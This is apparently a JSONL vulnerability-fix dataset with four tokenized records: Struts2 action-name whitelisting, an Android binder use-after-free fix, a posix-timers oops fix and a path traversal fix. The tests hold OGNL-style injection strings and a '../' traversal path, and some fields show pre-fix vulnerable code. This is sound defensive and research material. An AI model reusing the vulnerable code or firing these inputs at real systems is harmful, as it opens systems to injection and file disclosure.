{"contents": ["WW-4090", "Itroduces", "actions", "names'", "whitelisting", "git-svn-id:", "https://svn.apache.org/repos/asf/struts/struts2/branches/STRUTS_2_3_14_2_X@1488895", "13f79535-47bb-0310-9956-ffa450edef68"], "code_tokens": ["/", "**", "actions", "names", "'", "whitelist", "*", "*/", "public", "static", "final", "String", "STRUTS_ALLOWED_ACTION_NAMES", "=", "\"", "struts", ".", "allowed", ".", "action", ".", "names", "\"", ";", "import", "java", ".", "util", ".", "*;", "protected", "String", "allowedActionNames", "=", "\"", "[", "a", "-", "z", "]", "*[", "A", "-", "Z", "]", "*[", "0", "-", "9", "]", "*[", ".\\", "\\-", "_", "!", "/]", "*\"", ";", "@", "Inject", "(", "value", "=", "StrutsConstants", ".", "STRUTS_ALLOWED_ACTION_NAMES", ",", "required", "=", "false", ")", "public", "void", "setAllowedActionNames", "(", "String", "allowedActionNames", ")", "{", "this", ".", "allowedActionNames", "=", "allowedActionNames", ";", "}", "mapping", ".", "setName", "(", "cleanupActionName", "(", "name", ")", ");", "}", "/", "**", "*", "Cleans", "up", "action", "name", "from", "suspicious", "characters", "*", "*", "@", "param", "rawActionName", "action", "name", "extracted", "from", "URI", "*", "@", "return", "safe", "action", "name", "*", "/", "protected", "String", "cleanupActionName", "(", "final", "String", "rawActionName", ")", "{", "if", "(", "rawActionName", ".", "matches", "(", "allowedActionNames", ")", ")", "{", "return", "rawActionName", ";", "}", "else", "{", "String", "cleanActionName", "=", "rawActionName", ";", "for", "(", "String", "chunk", ":", "rawActionName", ".", "split", "(", "allowedActionNames", ")", ")", "{", "cleanActionName", "=", "cleanActionName", ".", "replace", "(", "chunk", ",", "\"", "\")", ";", "}", "return", "cleanActionName", ";", "}", "public", "void", "testAllowedActionNames", "(", ")", "throws", "Exception", "{", "DefaultActionMapper", "mapper", "=", "new", "DefaultActionMapper", "(", ");", "String", "actionName", "=", "\"", "action", "\"", ";", "assertEquals", "(", "actionName", ",", "mapper", ".", "cleanupActionName", "(", "actionName", ")", ");", "actionName", "=", "\"", "${", "action", "}", "\";", "assertEquals", "(", "\"", "action", "\"", ",", "mapper", ".", "cleanupActionName", "(", "actionName", ")", ");", "actionName", "=", "\"", "${", "${", "%{", "action", "}", "}}", "\";", "assertEquals", "(", "\"", "action", "\"", ",", "mapper", ".", "cleanupActionName", "(", "actionName", ")", ");", "actionName", "=", "\"", "${", "#", "foo", "=", "'", "action", "'", ",#", "foo", "}", "\";", "assertEquals", "(", "\"", "fooactionfoo", "\"", ",", "mapper", ".", "cleanupActionName", "(", "actionName", ")", ");", "actionName", "=", "\"", "test", "-", "action", "\"", ";", "assertEquals", "(", "\"", "test", "-", "action", "\"", ",", "mapper", ".", "cleanupActionName", "(", "actionName", ")", ");", "}</s>import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "Set", ";", "mapping", ".", "setName", "(", "name", ")", ";"], "docstring_tokens": ["modify", "server-side", "objects", "and", "inject", "and", "execute", "arbitrary", "commands", "on", "the", "system"]}
{"contents": ["binder:", "fix", "race", "that", "allows", "malicious", "free", "of", "live", "buffer", "Malicious", "code", "can", "attempt", "to", "free", "buffers", "using", "the", "BC_FREE_BUFFER", "ioctl", "to", "binder.", "There", "are", "protections", "against", "a", "user", "freeing", "a", "buffer", "while", "in", "use", "by", "the", "kernel,", "however", "there", "was", "a", "window", "where", "BC_FREE_BUFFER", "could", "be", "used", "to", "free", "a", "recently", "allocated", "buffer", "that", "was", "not", "completely", "initialized.", "This", "resulted", "in", "a", "use-after-free", "detected", "by", "KASAN", "with", "a", "malicious", "test", "program.", "This", "window", "is", "closed", "by", "setting", "the", "buffer's", "allow_user_free", "attribute", "to", "0", "when", "the", "buffer", "is", "allocated", "or", "when", "the", "user", "has", "previously", "freed", "it", "instead", "of", "waiting", "for", "the", "caller", "to", "set", "it.", "The", "problem", "was", "that", "when", "the", "struct", "buffer", "was", "recycled,", "allow_user_free", "was", "stale", "and", "set", "to", "1", "allowing", "a", "free", "to", "go", "through.", "Signed-off-by:", "Todd", "Kjos", "<tkjos@google.com>", "Acked-by:", "Arve", "Hj\u00f8nnev\u00e5g", "<arve@android.com>", "Cc:", "stable", "<stable@vger.kernel.org>", "#", "4.14", "Signed-off-by:", "Greg", "Kroah-Hartman", "<gregkh@linuxfoundation.org>"], "code_tokens": ["if", "(", "IS_ERR_OR_NULL", "(", "buffer", ")", ")", "{", "if", "(", "PTR_ERR", "(", "buffer", ")", "=", "=", "-", "EPERM", ")", "{", "binder_user_error", "(", "\"", "%", "d", ":", "%", "d", "BC_FREE_BUFFER", "u", "%", "016llx", "matched", "unreturned", "or", "currently", "freeing", "buffer", "\\", "n", "\"", ",", "proc", "-", ">", "pid", ",", "thread", "-", ">", "pid", ",", "(", "u64", ")", "data_ptr", ")", ";", "}", "else", "{", "binder_user_error", "(", "\"", "%", "d", ":", "%", "d", "BC_FREE_BUFFER", "u", "%", "016llx", "no", "match", "\\", "n", "\"", ",", "proc", "-", ">", "pid", ",", "thread", "-", ">", "pid", ",", "(", "u64", ")", "data_ptr", ")", ";", "}", "*", "free", "the", "buffer", "when", "in", "use", "by", "kernel", "or", "*", "after", "it", "'", "s", "already", "been", "freed", ".", "if", "(", "!", "buffer", "-", ">", "allow_user_free", ")", "return", "ERR_PTR", "(", "-", "EPERM", ")", ";", "buffer", "-", ">", "allow_user_free", "=", "0", ";", "buffer", "-", ">", "allow_user_free", "=", "0", ";", "unsigned", "debug_id", ":", "29", ";</s>t", "-", ">", "buffer", "-", ">", "allow_user_free", "=", "0", ";", "if", "(", "buffer", "=", "=", "NULL", ")", "{", "binder_user_error", "(", "\"%", "d", ":", "%", "d", "BC_FREE_BUFFER", "u", "%", "016llx", "no", "match", "\\", "n", "\"", ",", "proc", "-", ">", "pid", ",", "thread", "-", ">", "pid", ",", "(", "u64", ")", "data_ptr", ")", ";", "break", ";", "}", "if", "(", "!", "buffer", "-", ">", "allow_user_free", ")", "{", "binder_user_error", "(", "\"%", "d", ":", "%", "d", "BC_FREE_BUFFER", "u", "%", "016llx", "matched", "unreturned", "buffer", "\\", "n", "\"", ",", "proc", "-", ">", "pid", ",", "thread", "-", ">", "pid", ",", "(", "u64", ")", "data_ptr", ")", ";", "*", "free", "the", "buffer", "twice", "if", "(", "buffer", "-", ">", "free_in_progress", ")", "{", "binder_alloc_debug", "(", "BINDER_DEBUG_USER_ERROR", ",", "\"", "%", "d", ":", "%", "d", "FREE_BUFFER", "u", "%", "016llx", "user", "freed", "buffer", "twice", "\\", "n", "\"", ",", "alloc", "-", ">", "pid", ",", "current", "-", ">", "pid", ",", "(", "u64", ")", "user_ptr", ")", ";", "return", "NULL", ";", "}", "buffer", "-", ">", "free_in_progress", "=", "1", ";", "buffer", "-", ">", "free_in_progress", "=", "0", ";", "unsigned", "free_in_progress", ":", "1", ";", "unsigned", "debug_id", ":", "28", ";"], "docstring_tokens": ["free", "buffers", "in", "the", "kernel-managed", "shared", "memory", "region"]}
{"contents": ["posix-timers:", "Fix", "oops", "in", "clock_nanosleep()", "with", "CLOCK_MONOTONIC_RAW", "Prevent", "calling", "do_nanosleep()", "with", "clockid", "CLOCK_MONOTONIC_RAW,", "it", "may", "cause", "oops,", "such", "as", "NULL", "pointer", "dereference.", "Signed-off-by:", "Hiroshi", "Shimamoto", "<h-shimamoto@ct.jp.nec.com>", "Cc:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Cc:", "Thomas", "Gleixner", "<tglx@linutronix.de>", "Cc:", "John", "Stultz", "<johnstul@us.ibm.com>", "Cc:", "<stable@kernel.org>", "LKML-Reference:", "<4A764FF3.50607@ct.jp.nec.com>", "Signed-off-by:", "Ingo", "Molnar", "<mingo@elte.hu>"], "code_tokens": ["static", "int", "no_nsleep", "(", "const", "clockid_t", "which_clock", ",", "int", "flags", ",", "struct", "timespec", "*", "tsave", ",", "struct", "timespec", "__user", "*", "rmtp", ")", "{", "return", "-", "EOPNOTSUPP", ";", "}", ".", "nsleep", "=", "no_nsleep", ",</s>"], "docstring_tokens": ["a", "denial", "of", "service", "(OOPS", ")", "or", "possibly", "gain", "privileges"]}
{"contents": ["Fix", "a", "path", "traversal", "issue", "when", "using", "root", "fixes", "#59", "fixes", "#60"], "code_tokens": ["unreleased", "=", "==", "==", "==", "==", "=", "*", "Fix", "a", "path", "traversal", "issue", "when", "using", "`", "root", "`", "root", "=", "normalize", "(", "root", "+", "sep", ")", "parts", "=", "path", ".", "substr", "(", "root", ".", "length", ")", ".", "split", "(", "sep", ")", "loki", "it", "(", "'", "should", "with", "with", "trailing", "slash", "'", ",", "function", "(", "done", ")", "{", "var", "app", "=", "http", ".", "createServer", "(", "function", "(", "req", ",", "res", ")", "{", "send", "(", "req", ",", "req", ".", "url", ",", "{", "root", ":", "__dirname", "+", "'", "/", "fixtures", "/", "'}", ")", ".", "pipe", "(", "res", ")", ";", "}", ");", "request", "(", "app", ")", ".", "get", "(", "'/", "name", ".", "txt", "'", ")", ".", "expect", "(", "200", ",", "'", "tobi", "'", ",", "done", ")", "}", ")", "it", "(", "'", "should", "not", "allow", "root", "transversal", "'", ",", "function", "(", "done", ")", "{", "var", "app", "=", "http", ".", "createServer", "(", "function", "(", "req", ",", "res", ")", "{", "send", "(", "req", ",", "req", ".", "url", ",", "{", "root", ":", "__dirname", "+", "'", "/", "fixtures", "/", "name", ".", "d", "'", "})", ".", "pipe", "(", "res", ")", ";", "}", ");", "request", "(", "app", ")", ".", "get", "(", "'/", "..", "/", "name", ".", "dir", "/", "name", ".", "txt", "'", ")", ".", "expect", "(", "403", ",", "done", ")", "}", ")</s>root", "=", "normalize", "(", "root", ")", "parts", "=", "path", ".", "substr", "(", "root", ".", "length", "+", "1", ")", ".", "split", "(", "sep", ")"], "docstring_tokens": ["access", "files", "outside", "of", "the", "restricted", "directory"]}
